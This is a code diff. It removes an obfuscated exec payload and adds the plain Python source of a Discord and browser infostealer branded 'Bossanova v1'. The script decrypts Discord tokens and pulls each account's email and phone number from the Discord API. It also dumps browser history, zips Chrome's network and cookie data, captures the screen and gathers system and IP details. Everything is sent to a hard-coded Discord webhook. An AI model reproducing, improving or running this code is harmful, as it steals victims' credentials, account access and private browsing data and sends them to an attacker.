@@ -1,2 +1,424 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+from Crypto.Cipher import AES
+import base64
+import io
+import json
+import os
+import platform
+import shutil
+import socket
+import sqlite3
+import subprocess
+import sys
+import tempfile
+import time
+import win32crypt
+import pyautogui
+from PIL import Image
+import requests
+
+
+def get_master_key():
+  appdata = os.getenv("APPDATA")
+  if not appdata:
+    return None
+
+  local_state_path = os.path.join(appdata, "discord", "Local State")
+  if not os.path.exists(local_state_path):
+    local_appdata = os.getenv("LOCALAPPDATA")
+    if local_appdata:
+      local_state_path = os.path.join(local_appdata, "Discord", "Local State")
+
+  if not os.path.exists(local_state_path):
+    return None
+
+  try:
+    with open(local_state_path, "r", encoding="utf-8") as f:
+      local_state = json.load(f)
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+  except Exception:
+    return None
+
+
+def decrypt_val(buff, master_key):
+  try:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)[:-16].decode(
+        "utf-8", errors="ignore"
+    )
+    return decrypted_pass
+  except Exception:
+    return None
+
+
+def obtener_tokens_reales():
+  master_key = get_master_key()
+  if not master_key:
+    return []
+
+  tokens = []
+  leveldb_path = os.path.join(
+      os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"
+  )
+
+  if not os.path.exists(leveldb_path):
+    return []
+
+  for file in os.listdir(leveldb_path):
+    if file.endswith(".ldb") or file.endswith(".log"):
+      file_path = os.path.join(leveldb_path, file)
+      try:
+        with open(file_path, "rb") as f:
+          content = f.read()
+
+        pos = 0
+        while True:
+          pos = content.find(b"dQw4w9WgXcQ:", pos)
+          if pos == -1:
+            break
+
+          try:
+            end_pos = content.find(b'"', pos)
+            if end_pos == -1:
+              end_pos = pos + 150
+
+            encrypted_block = content[pos:end_pos]
+            if b":" in encrypted_block:
+              raw_data = base64.b64decode(encrypted_block.split(b":")[1])
+              token = decrypt_val(raw_data, master_key)
+              if token and token not in tokens:
+                tokens.append(token)
+          except Exception:
+            pass
+
+          pos += len(b"dQw4w9WgXcQ:")
+      except Exception:
+        continue
+
+  return tokens
+
+
+def generar_archivo_historial():
+  local_appdata = os.getenv("LOCALAPPDATA")
+  appdata = os.getenv("APPDATA")
+  txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")
+
+  if not local_appdata or not appdata:
+    with open(txt_path, "w", encoding="utf-8") as f:
+      f.write("No se pudieron obtener las rutas de AppData.")
+    return txt_path
+
+  navegadores = {
+      "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
+      "Brave": os.path.join(
+          local_appdata, "BraveSoftware", "Brave-Browser", "User Data"
+      ),
+      "Microsoft Edge": os.path.join(
+          local_appdata, "Microsoft", "Edge", "User Data"
+      ),
+      "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
+  }
+
+  temp_dir = tempfile.gettempdir()
+
+  with open(txt_path, "w", encoding="utf-8") as f_out:
+    f_out.write("=== HISTORIAL ===\n\n")
+
+    for nav_nombre, base_path in navegadores.items():
+      if not os.path.exists(base_path):
+        continue
+
+      perfiles = ["Default"]
+      try:
+        for item in os.listdir(base_path):
+          ruta_item = os.path.join(base_path, item)
+          if os.path.isdir(ruta_item) and (
+              item.startswith("Profile ")
+              or item == "Guest Profile"
+              or item == "System Profile"
+          ):
+            perfiles.append(item)
+      except Exception:
+        pass
+
+      for perfil in perfiles:
+        if nav_nombre == "Opera Stable":
+          history_path = os.path.join(base_path, "History")
+          if not os.path.exists(history_path):
+            history_path = os.path.join(base_path, perfil, "History")
+        else:
+          history_path = os.path.join(base_path, perfil, "History")
+
+        if not os.path.exists(history_path):
+          continue
+
+        temp_history = os.path.join(
+            temp_dir, f"history_{nav_nombre.replace(' ', '_')}_{perfil}"
+        )
+
+        try:
+          shutil.copy2(history_path, temp_history)
+          conn = sqlite3.connect(temp_history)
+          cursor = conn.cursor()
+
+          query = """
+                        SELECT url, title, last_visit_time 
+                        FROM urls 
+                        ORDER BY last_visit_time DESC
+                    """
+          cursor.execute(query)
+          rows = cursor.fetchall()
+
+          f_out.write(
+              f"\n--- [ Navegador: {nav_nombre} | Perfil: {perfil} ] ---\n"
+          )
+          for row in rows:
+            url, title, _ = row
+            titulo_seguro = title if title else "Sin título"
+            f_out.write(
+                f"Título: {titulo_seguro}\nURL:"
+                f" {url}\n----------------------------------------\n"
+            )
+
+          cursor.close()
+          conn.close()
+        except Exception:
+          pass
+        finally:
+          if os.path.exists(temp_history):
+            try:
+              os.remove(temp_history)
+            except:
+              pass
+
+  return txt_path
+
+
+def empaquetar_network():
+  network_dir = os.path.join(
+      os.path.expanduser("~"),
+      "AppData",
+      "Local",
+      "Google",
+      "Chrome",
+      "User Data",
+      "Default",
+      "Network",
+  )
+
+  if not os.path.exists(network_dir):
+    return None
+
+  temp_dir = tempfile.gettempdir()
+  staging_dir = os.path.join(temp_dir, "chrome_network_staging")
+  zip_base_path = os.path.join(temp_dir, "chrome_network_data")
+
+  try:
+    if os.path.exists(staging_dir):
+      shutil.rmtree(staging_dir, ignore_errors=True)
+    os.makedirs(staging_dir, exist_ok=True)
+
+    for item in os.listdir(network_dir):
+      source_item = os.path.join(network_dir, item)
+      target_item = os.path.join(staging_dir, item)
+      try:
+        if os.path.isdir(source_item):
+          shutil.copytree(source_item, target_item, dirs_exist_ok=True)
+        else:
+          shutil.copy2(source_item, target_item)
+      except Exception:
+        pass
+
+    shutil.make_archive(zip_base_path, "zip", staging_dir)
+    final_zip_file = zip_base_path + ".zip"
+
+    if os.path.exists(staging_dir):
+      shutil.rmtree(staging_dir, ignore_errors=True)
+
+    return final_zip_file
+  except Exception:
+    return None
+
+
+def capturar_pantalla_jpg():
+  try:
+    # Tomar captura de pantalla completa
+    screenshot = pyautogui.screenshot()
+
+    # Convertir y guardar en memoria como JPEG
+    img_byte_arr = io.BytesIO()
+    # Convertir a RGB por si la imagen tiene canal alfa (PNG transparente) que JPEG no soporta directamente
+    rgb_im = screenshot.convert("RGB")
+    rgb_im.save(img_byte_arr, format="JPEG", quality=85)
+    img_byte_arr.seek(0)
+    return img_byte_arr
+  except Exception:
+    return None
+
+
+######## Webhook #############################################################
+
+WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560081432678895616/zHK9qlIKhkH4FyZmxwrybudV8QEqVrhz-IY0avSoUKk3pyaV9J8PSZTgiW8PyjxXyMHa"
+
+
+def obtener_info_pc():
+  info_sistema = {}
+
+  try:
+    cmd_cpu = "wmic cpu get name"
+    procesador = (
+        subprocess.check_output(cmd_cpu, shell=True)
+        .decode("utf-8", errors="ignore")
+        .split("\n")[1]
+        .strip()
+    )
+    info_sistema["procesador"] = procesador if procesador else "Desconocido"
+  except Exception:
+    info_sistema["procesador"] = platform.processor() or "Desconocido"
+
+  info_sistema["os"] = (
+      f"{platform.system()} {platform.release()} ({platform.version()})"
+  )
+  info_sistema["nombre_pc"] = socket.gethostname()
+
+  try:
+    info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
+  except Exception:
+    info_sistema["ip_local"] = "No disponible"
+
+  try:
+    response = requests.get("https://api.ipify.org?format=json", timeout=5)
+    info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
+  except Exception:
+    info_sistema["ip_publica"] = "No disponible"
+
+  try:
+    cmd_gpu = "wmic path win32_videocontroller get name"
+    gpu = (
+        subprocess.check_output(cmd_gpu, shell=True)
+        .decode("utf-8", errors="ignore")
+        .split("\n")[1]
+        .strip()
+    )
+    info_sistema["gpu"] = gpu if gpu else "Desconocida"
+  except Exception:
+    info_sistema["gpu"] = "No disponible"
+
+  return info_sistema
+
+
+def obtener_datos_usuario(token):
+  headers = {"Authorization": token.strip(), "Content-Type": "application/json"}
+  try:
+    response = requests.get(
+        "https://discord.com/api/v10/users/@me", headers=headers
+    )
+    if response.status_code == 200:
+      return {"success": True, "data": response.json()}
+    else:
+      return {"success": False, "status": response.status_code}
+  except Exception as e:
+    return {"success": False, "status": str(e)}
+
+
+def enviar_reporte_completo(tokens):
+  datos_pc = obtener_info_pc()
+
+  descripcion = (
+      f" **PC:** `{datos_pc['nombre_pc']}`\n"
+      f" **OS:** `{datos_pc['os']}`\n"
+      f" **Procesador:** `{datos_pc['procesador']}`\n"
+      f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+      f" **IP Local:** `{datos_pc['ip_local']}`\n"
+      f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+      f"---\n"
+      f" **Tokens:**\n"
+  )
+
+  if tokens:
+    for token in tokens:
+      token_limpio = token.strip()
+      resultado = obtener_datos_usuario(token_limpio)
+
+      if resultado["success"]:
+        user_data = resultado["data"]
+        username = user_data.get("username", "Desconocido")
+        user_id = user_data.get("id", "Desconocido")
+        email = user_data.get("email", "No disponible")
+        phone = user_data.get("phone", "No disponible")
+
+        descripcion += (
+            f"\n **User:** `{username}` (ID: `{user_id}`)\n"
+            f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
+            f"• **Token:**\n`{token_limpio}`\n"
+        )
+      else:
+        status = resultado["status"]
+        descripcion += (
+            f"\n **Token Inválido (Error: {status}):**\n`{token_limpio}`\n"
+        )
+
+      time.sleep(0.5)
+  else:
+    descripcion += "_No se encontraron tokens._"
+
+  if len(descripcion) > 4000:
+    descripcion = descripcion[:3997] + "..."
+
+  payload = {
+      "embeds": [{
+          "title": "Bossanova v1",
+          "description": descripcion,
+          "color": 5814783,
+          "footer": {"text": "Por BossaNova"},
+      }]
+  }
+
+  txt_path = generar_archivo_historial()
+  zip_path = empaquetar_network()
+  img_jpg_stream = capturar_pantalla_jpg()
+
+  files = {}
+  try:
+    f_txt = open(txt_path, "rb") if os.path.exists(txt_path) else None
+    f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None
+
+    if f_txt:
+      files["file1"] = ("historial_global.txt", f_txt, "text/plain")
+    if f_zip:
+      files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")
+    if img_jpg_stream:
+      files["file3"] = ("captura.jpg", img_jpg_stream.getvalue(), "image/jpeg")
+
+    requests.post(
+        WEBHOOK_URL_UNICO,
+        data={"payload_json": json.dumps(payload)},
+        files=files,
+    )
+
+    if f_txt:
+      f_txt.close()
+    if f_zip:
+      f_zip.close()
+  except Exception:
+    pass
+
+  if os.path.exists(txt_path):
+    try:
+      os.remove(txt_path)
+    except:
+      pass
+
+  if zip_path and os.path.exists(zip_path):
+    try:
+      os.remove(zip_path)
+    except:
+      pass
+
+
+if __name__ == "__main__":
+  tokens = obtener_tokens_reales()
+  enviar_reporte_completo(tokens)
